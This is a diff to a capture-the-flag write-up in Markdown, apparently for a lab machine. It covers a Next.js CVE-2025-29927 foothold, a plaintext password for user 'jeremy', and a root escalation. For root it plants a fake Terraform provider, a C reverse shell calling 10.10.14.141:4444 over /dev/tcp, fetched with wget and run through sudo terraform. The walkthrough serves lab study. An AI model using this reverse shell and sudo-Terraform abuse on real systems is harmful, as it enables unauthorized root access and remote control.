@@ -1,6 +1,7 @@
 ![[IMG-20250823234029175.png]]
+## Foothold
 
-# [CVE-2025-29927](https://github.com/lirantal/vulnerable-nextjs-14-CVE-2025-29927)
+### [CVE-2025-29927](https://github.com/lirantal/vulnerable-nextjs-14-CVE-2025-29927)
 
 ![[IMG-20250824012840494.png]]
 
@@ -58,6 +59,8 @@ let o = {
       };
 ```
 
+## User Flag
+
 ```
 user: jeremy
 password: MyNameIsJeremyAndILovePancakes
@@ -65,13 +68,53 @@ password: MyNameIsJeremyAndILovePancakes
 
 ![[IMG-20250825144931061.png]]
 
+## Root Flag
+
+### Analyse
+
 ![[IMG-20250825172605435.png]]
+
+![[IMG-20250825180207799.png]]
+
+### Exploit
 
 [Doc Terraform](https://developer.hashicorp.com/terraform/cli/config/environment-variables)
 
 ![[IMG-20250825172549609.png]]
 
+Load a config file custom.
+
 ![[IMG-20250825173844708.png]]
+
+### Attacker machine
+
+```bash
+gcc main.c -o terraform-provider-examples
+python3 -m http.server 8000
+nc -lvnp 4444
+```
+
+main.c:
+```c
+#include <unistd.h>
+int main() {
+    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.141/4444 0>&1", NULL);
+    return 0;
+}
+
+```
+
+### Victim machine
+
+```bash
+wget http://10.10.14.141:8000/terraform-provider-examples
+chmod +x terraform-provider-examples
+sudo /usr/bin/terraform -chdir\=/opt/examples apply
+```
+
+![[IMG-20250825175332705.png]]
+
+![[IMG-20250825175351049.png]]
 
 
 
